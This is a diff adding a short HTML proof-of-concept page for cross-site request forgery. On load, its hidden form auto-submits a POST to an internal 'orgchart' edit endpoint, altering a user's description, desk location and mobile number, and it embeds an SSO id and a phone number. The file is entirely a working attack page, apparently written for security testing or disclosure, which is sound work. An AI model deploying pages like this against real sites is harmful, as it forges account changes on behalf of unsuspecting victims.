@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - should make request</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form action="https://orgchart/edit_desc.php" method="POST" id="csrfForm">
+        <input type="hidden" name="sso" value="212628051">
+        <input type="hidden" name="desc" value="">
+        <input type="hidden" name="table" value="6C6/12">
+        <input type="hidden" name="mobile" value="+420720843234">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
